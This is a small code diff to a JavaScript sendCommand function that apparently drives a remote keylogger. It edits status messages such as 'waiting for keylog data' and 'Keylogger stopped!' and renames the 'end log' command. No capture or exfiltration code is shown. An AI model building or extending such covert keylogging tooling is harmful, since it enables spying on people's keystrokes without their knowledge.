@@ -44,11 +44,11 @@ function sendCommand(command) {
                 result.textContent = "Failed to send command!";
             else 
                 if (command == 'log')
-                    result.textContent = "Keylogger started!";
-                else if (command == 'end-log')
-                    result.textContent = "Keylogger ended!";
+                    result.textContent = "Command sent! (waiting for keylog data ...)";
+                else if (command == 'end log')
+                    result.textContent = "Keylogger stopped!";
                 else 
-                result.textContent = "";
+                    result.textContent = "";
 
         })
         .catch(error => {
